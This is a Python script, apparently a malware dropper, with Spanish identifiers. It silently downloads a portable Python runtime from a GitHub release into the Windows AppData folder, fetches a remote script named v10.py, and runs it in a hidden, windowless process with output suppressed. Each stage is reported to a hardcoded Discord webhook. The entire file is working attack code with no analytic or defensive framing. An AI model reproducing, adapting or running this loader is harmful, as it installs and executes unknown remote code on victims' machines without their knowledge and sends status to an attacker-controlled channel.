import json
import os
import subprocess
import urllib.request
import zipfile

URL_PY_ZIP = "https://github.com/zzzzsit4/v10/releases/download/new/py.zip"
URL_V10 = "https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v10.py"

WEBHOOK_URL = "https://discord.com/api/webhooks/1560652221035839528/SlDSAV1HKo0Xw42HTs_y6KsVLBZSQ6pUqpN59eM1K044bhjU7iwHBh4bSCfA7bvc6jO6"

DIRECTORIO_DESTINO = os.path.join(os.environ.get("APPDATA", "C:\\"), "V10Runtime")
ZIP_TEMPORAL = os.path.join(DIRECTORIO_DESTINO, "py.zip")

def enviar_webhook(mensaje):
    if "TU_WEBHOOK_URL" in WEBHOOK_URL or not WEBHOOK_URL:
        return
    try:
        payload = json.dumps({"content": mensaje}).encode("utf-8")
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=payload,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        pass

def descargar_archivo_seguro(url, destino):
    headers = {"User-Agent": "Mozilla/5.0", "Cache-Control": "no-cache"}
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=15) as response, open(destino, 'wb') as out_file:
        while True:
            chunk = response.read(16384)
            if not chunk:
                break
            out_file.write(chunk)

def encontrar_python():
    if not os.path.exists(DIRECTORIO_DESTINO):
        return None
    for root, dirs, files in os.walk(DIRECTORIO_DESTINO):
        if "python.exe" in files:
            return os.path.join(root, "python.exe")
    return None

def preparar_y_exec():
    try:
        enviar_webhook(" [Dependencias] Iniciando proceso de configuración...")

        if not os.path.exists(DIRECTORIO_DESTINO):
            os.makedirs(DIRECTORIO_DESTINO, exist_ok=True)

        python_ejecutable = encontrar_python()
        if not python_ejecutable:
            enviar_webhook(" [Dependencias] Descargando py.zip desde GitHub Releases...")
            descargar_archivo_seguro(URL_PY_ZIP, ZIP_TEMPORAL)

            enviar_webhook(" [Dependencias] Extrayendo archivos portables...")
            with zipfile.ZipFile(ZIP_TEMPORAL, "r") as zip_ref:
                zip_ref.extractall(DIRECTORIO_DESTINO)

            for root, dirs, files in os.walk(DIRECTORIO_DESTINO):
                for archivo in files:
                    if archivo.endswith("._pth"):
                        ruta_pth = os.path.join(root, archivo)
                        with open(ruta_pth, "r", encoding="utf-8") as f:
                            contenido = f.read()
                        if "#import site" in contenido:
                            contenido = contenido.replace("#import site", "import site")
                            with open(ruta_pth, "w", encoding="utf-8") as f:
                                f.write(contenido)

            python_ejecutable = encontrar_python()
            enviar_webhook(" [Dependencias] Entorno portable configurado.")

        enviar_webhook(" [Dependencias] Descargando código v10 desde GitHub...")
        req_v10 = urllib.request.Request(URL_V10, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req_v10, timeout=15) as response:
            codigo_v10 = response.read().decode("utf-8")

        if python_ejecutable:
            enviar_webhook(" [Dependencias] Ejecutando v10 en memoria RAM...")
            
            subprocess.Popen(
                [python_ejecutable, "-c", codigo_v10],
                creationflags=0x08000000,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            enviar_webhook(" [Dependencias] v10 ejecutado en RAM con éxito.")
        else:
            enviar_webhook(" [Error] No pudo encontrarse python portable.")

    except Exception as e:
        enviar_webhook(f" [Error en dependencias]: {str(e)}")

preparar_y_exec()
